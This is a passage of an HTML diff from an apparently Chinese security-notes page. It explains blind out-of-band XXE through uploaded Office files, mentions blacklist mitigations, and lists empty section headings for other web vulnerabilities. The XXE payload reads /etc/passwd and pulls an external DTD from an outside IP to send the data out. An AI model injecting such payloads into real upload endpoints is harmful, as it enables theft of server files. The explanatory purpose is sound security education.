+<p>文件上传类Blind OOB XXE<br>这是关于XXE一个重要的测试技巧，在挖掘XXE漏洞过程中要留意接受.docx 、.xlsx和.pptx格式文件的上传，你可以尝试用winrar等解压文件打开一个excel文件，会发现它其实是个 XML 文件的压缩包，如Facebok的一个职位页面允许用户上传 .docx 文件，这里使用7zip打开一个docx文件，并在其中插入payload：<br><!DOCTYPE root [<br /><!ENTITY % file SYSTEM"file:///etc/passwd"><br><!ENTITY % dtd SYSTEM"http://197.37.102.90/ext.dtd"><br>%dtd;<br>%send;<br>]]&gt;<br>服务器在解析这个docx文件的时候，如果受害者开启了外部实体，XML 解析器会调用远程主机，!ENTITY 定义中和下面使用了 % 。这是因为这些占位符用在 DTD 自身中。在收到请求调用之后，远程服务器会发送回 DTD 文件：<br><a name="puHNs"></a></p>
+<h4 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h4><p>1）禁用外部实体<br>2）手动黑名单过滤<br>&lt;!DOCTYPE、<!ENTITY SYSTEM、PUBLIC
+<a name="xss"></p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>xss分为三类</p>
+<p><a name="CRLF"></a></p>
+<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p><a name="481e034e"></a></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a name="54d3a710"></a></p>
+<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><a name="285ee0a5"></a></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><a name="CSRF"></a></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><a name="58f31022"></a></p>
+<h2 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h2><p><a name="93d27c6a"></a></p>
+<h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><p><a name="SSRF"></a></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><a name="4d9de9c3"></a></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><a name="1f6d282f"></a></p>
+<h2 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h2><p><a name="c09aa958"></a></p>
+<h2 id="应用类"><a href="#应用类" class="headerlink" title="应用类"></a>应用类</h2><p><a name="d2386d11"></a></p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p><a name="68d5321b"></a></p>
+<h2 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h2><p><a name="9c6b8cb9"></a></p>
+<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2>
       
     </div>
 
